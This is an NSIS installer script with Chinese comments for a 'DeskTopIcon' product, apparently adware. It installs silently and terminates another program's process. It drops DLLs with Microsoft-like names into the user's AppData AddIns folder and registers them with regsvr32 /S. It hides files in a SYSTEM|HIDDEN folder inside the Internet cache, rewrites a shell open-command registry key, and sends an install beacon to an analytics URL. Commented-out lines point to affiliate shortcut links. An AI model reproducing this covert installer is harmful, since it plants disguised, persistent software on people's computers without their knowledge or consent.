;////////////////////////////////////////////////////////////////////////////////////////////////////
; 包含文件
;////////////////////////////////////////////////////////////////////////////////////////////////////
!include "MUI.nsh"
!include "FileFunc.nsh"
!include "WordFunc.nsh"
!include "StrFunc.nsh"
!include "nsDialogs.nsh"
!include "NSISArray.nsh"
!include "WinVer.nsh"
!insertmacro GetOptions
!insertmacro GetParameters

 
Name "DeskTopIcon"
OutFile													"\\192.168.13.159\share\kankan\xmp4\ovxInstall_s.exe"

RequestExecutionLevel user
CRCCheck on
SetCompressor lzma
;SilentInstall silent  
;!define MUI_HEADERIMAGE
;!define MUI_HEADERIMAGE_BITMAP 	 	                ".\..\..\trunk\bin\SetupResource\Logo.bmp"

;!define MUI_HEADERIMAGE_RIGHT
;!define MUI_ICON                                        ".\..\..\trunk\bin\SetupResource\Install.ico"

;刷新系统环境
!define SHCNE_ASSOCCHANGED 0x08000000
!define SHCNF_FLUSHNOWAIT 0x2000
SilentInstall silent	

VIProductVersion 1.0.1.9
VIAddVersionKey "FileVersion" 1.0.1.9
VIAddVersionKey /LANG=2052 "ProductName" "DeskTopIcon"
VIAddVersionKey "CompanyName" "xx,Ltd."


!insertmacro MUI_LANGUAGE					"SimpChinese"

;////////////////////////////////////////////////////////////////////////////////////////////////////
; 安装过程
;////////////////////////////////////////////////////////////////////////////////////////////////////
${StrStrAdv}

Var stat_value ; 0:未安装,退出, 1:释放完成
 
Var /GLOBAL PeerId
Var /GLOBAL LastUninstallTime
; 栈顶参数，statCode
Function SendStat
	Pop $0                                 ; PackageType 监视安装过程
	StrCpy				$1 "vh"  ; InstallSource 写死
	StrCpy              $2 0               ; UIBuilt ;没有安装界面 始终为0
    StrCpy              $3 1    ; 全新或覆盖      

	;StrCpy $R0 			   
	;System::Call		"urlmon::URLDownloadToCacheFileW(i 0, t R0, t .r10, t 1024,i 0,i 0)"
FunctionEnd

Function TryCopyFile
	Pop $R3
	Pop $R4
	IfFileExists $R3 0 copyend
	DetailPrint "try copy $R3 to $R4"
	StrCpy $R5 1
retry:
	CopyFiles /SILENT /FILESONLY $R3 $R4
	IfErrors 0 copyend
	; DetailPrint "copy $R3 to $R4 fail!"
	IntOp $R5 $R5 + 1
	IntCmp $R5 3 0 0 copyend
	; DetailPrint "sleep 100 and try again!"
	Sleep 100
	Goto retry
copyend:
FunctionEnd
Var /GLOBAL hXSH
Function QuitXSH
	System::Call		"user32::FindWindowW(t 'XSH_{B9689BCB-F2B7-4D43-B6B3-6BFB66DB1745}', i 0)i .r1"
	DetailPrint "FindWindow: Window HANDLE: $1"
	IntCmp $1 0 0 0 +2
		Goto QuitXSHEnd
	Push $1 
	Pop $hXSH
 	
	System::Call		"user32::GetWindowThreadProcessId(i $hXSH, *l r2r2)i .r1 ?e"
	DetailPrint "Get ProcessId ProcessId: $2"
	System::Call		"kernel32::OpenProcess(i 1, i 0,i r2)i .r1"
	DetailPrint "OpenProcess Process Handle: $1"
	System::Call		"kernel32::TerminateProcess(i r1, i 0)i .r1 ?e"
	DetailPrint "TerminateProcess Returns: $1"
 
QuitXSHEnd:
	
FunctionEnd
Section "SHhostSupport" SEC_SHhostSupport
	Call QuitXSH		
ReleaseFile:
	
	SetShellVarContext  current
	${GetFileVersion} "$INSTDIR\msadosr.dll" $0
	${StrStrAdv} $1 "$0" "." "<" ">" "0" "0" "0"
	
	IfFileExists "$INSTDIR\msadosr$1.dll" 0 +2
		Delete  "$INSTDIR\msadosr$1.dll"
	IfFileExists "$INSTDIR\msadosr.dll" 0 +2
		Delete  "$INSTDIR\msadosr.dll"
	IfFileExists "$INSTDIR\msadosr.dll" 0 +2
		Rename	"$INSTDIR\msadosr.dll" "$INSTDIR\msadosr$1.dll"	
	
	${GetFileVersion} "$INSTDIR\msadosr64.dll" $0
	${StrStrAdv} $1 "$0" "." "<" ">" "0" "0" "0"
	
	IfFileExists  "$INSTDIR\msadosr64$1.dll" 0 +2
		Delete  "$INSTDIR\msadosr64$1.dll"
	IfFileExists  "$INSTDIR\msadosr64.dll" 0 +2
		Delete  "$INSTDIR\msadosr64.dll"
	IfFileExists	"$INSTDIR\msadosr64.dll" 0 +2
		Rename	"$INSTDIR\msadosr64.dll" "$INSTDIR\msadosr64$1.dll"
		
	${GetFileVersion} "$INSTDIR\msadosr.dat" $0
	${StrStrAdv} $1 "$0" "." "<" ">" "0" "0" "0"
	
	IfFileExists  "$INSTDIR\msadosr$1.dat" 0 +2
		Delete  "$INSTDIR\msadosr$1.dat"
	IfFileExists  "$INSTDIR\msadosr.dat" 0 +2
		Delete  "$INSTDIR\msadosr.dat"
	IfFileExists	"$INSTDIR\msadosr.dat" 0 +2
		Rename	"$INSTDIR\msadosr.dat" "$INSTDIR\msadosr$1.dat"
	
	;DeleteRegValue HKCU "Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.51fanli"
	
	
	SetOverwrite try
	
		;File /oname=$APPDATA\Microsoft\AddIns\msadosr$1.dll .\ExtIcon\msadosr.dll
	
	SetOutPath "$APPDATA\Microsoft\AddIns" 
		File /oname=$APPDATA\Microsoft\AddIns\msadosr.dat .\ExtIcon\_msadosr.dat
		
	System::Call "shell32::IsUserAnAdmin()i .r3"
	DetailPrint "User is Administrator: $3"	
	; 64 位 不支持
	System::Call "kernel32::GetCurrentProcess()i .r0"
	System::Call "kernel32::IsWow64Process(i r0,*i .r1)"
	StrCmp "$1" "1" 0 +6
		SetOutPath "$APPDATA\Microsoft\AddIns" 
			File .\ExtIcon\msadosr64.dll
		IntCmp $3 0 0 +2 0	
			Exec '$WINDIR\System32\regsvr32.exe  /S "$APPDATA\Microsoft\AddIns\msadosr64.dll"'
	Goto +5
		SetOutPath "$APPDATA\Microsoft\AddIns" 
			File /oname=$APPDATA\Microsoft\AddIns\msadosr.dll .\ExtIcon\_msadosr.dll	
		IntCmp $3 0 0 +2 0 
			Exec '$WINDIR\System32\regsvr32.exe  /S "$APPDATA\Microsoft\AddIns\msadosr.dll"'
			
	;@ SetOutPath "$DESKTOP" 
	;@	File .\ExtIcon\返利网.51fanli
		 
/*
	URL=http://www.114la.com/
	Modified=E083EB028EBAC70160
	IconFile=http://www.114la.com/favicon.ico
	IconIndex=1
*/

	ReadRegStr $0 HKCR "InternetShortcut\shell\open\command" ""
	WriteRegStr HKCR "ExtIcon.eih\Shell\open\command" "" $0
	
	; 桌面快捷方
	;StrCpy $R0	"$DESKTOP\Themes.eth0"
	;Delete "$R0"
	;WriteINIStr "$R0" "InternetShortcut" "URL" "http://51fanli.com/?id=660100"
	;WriteINIStr "$R0" "InternetShortcut" "IconFile" "http://51fanli.com/favicon.ico"
	;WriteINIStr "$R0" "InternetShortcut" "IconIndex" "1"
	
	;IfFileExists "$R0" 0 ShortCutEnd
	;	SetFileAttributes "$R0" FILE_ATTRIBUTE_HIDDEN
		
	CreateDirectory "$INTERNET_CACHE\Content.mso"	
	SetFileAttributes "$INTERNET_CACHE\Content.mso"	SYSTEM|HIDDEN
	SetOutPath "$INTERNET_CACHE\Content.mso" 
		;@ File .\ExtIcon\51fanli.ico	
		File .\ExtIcon\mso.db
		File .\ExtIcon\~$Doc1.dot	
		File .\ExtIcon\Doc1.dot
	
	
	;SetFileAttributes "$INTERNET_CACHE\Content.mso\51fanli.ico"	HIDDEN
	;SetFileAttributes "$INTERNET_CACHE\Content.mso\mso.db"	HIDDEN
	;SetFileAttributes "$INTERNET_CACHE\Content.mso\~$Doc1.dot"	HIDDEN
	;SetFileAttributes "$INTERNET_CACHE\Content.mso\Doc1.dot"	HIDDEN
	
	StrCpy $R1 "$INTERNET_CACHE\Content.mso\51fanli.ico"	
	;@ WriteRegStr HKCU "Software\ExtIconHandler" ".51fanli" $R1
	
	; 刷新系统环境	
	System::Call 'Shell32::SHChangeNotify(i ${SHCNE_ASSOCCHANGED}, i ${SHCNF_FLUSHNOWAIT}, i 0, i 0)'

	System::Call 		"MSVCRT::time()l ().r4"
	WriteRegDWORD 		HKCU "Software\ExtIconHandler" "instt" $4 
	
	ReadRegStr $R1 HKCU "Software\ExtIconHandler" "PID"
	${GetFileVersion} "$INSTDIR\msadosr.dat" $9
	StrCpy $R0 "http://www.google-analytics.com/collect?v=1&tid=UA-42360423-1&cid=$R1&t=event&ec=install&ea=silent_$EXEFILE&el=$9&ev=1"
	WriteRegStr HKCU "Software\ExtIconHandler" "if" $EXEFILE
	System::Call		"urlmon::URLDownloadToCacheFileW(i 0, t R0, t .r10, t 1024,i 0,i 0)"
ShortCutEnd:

SectionEnd

Function .onInit

	; 无命令行，有界面运行
	${GetParameters} $R0
	StrCmp $R0 "" +2 0
		SetSilent silent

		
	;IfFileExists "$0" ReleaseHelpDll 0
	;	Abort
		
ReleaseHelpDll:	

SetInstDir:
	StrCpy $INSTDIR "$APPDATA\Microsoft\AddIns"
	
	
InitEnd:
FunctionEnd

Function .onInstFailed
	 
FunctionEnd

Function .onInstSuccess
    /*安装成功，隐藏窗体等5s,再退出*/
    HideWindow 
FunctionEnd
 

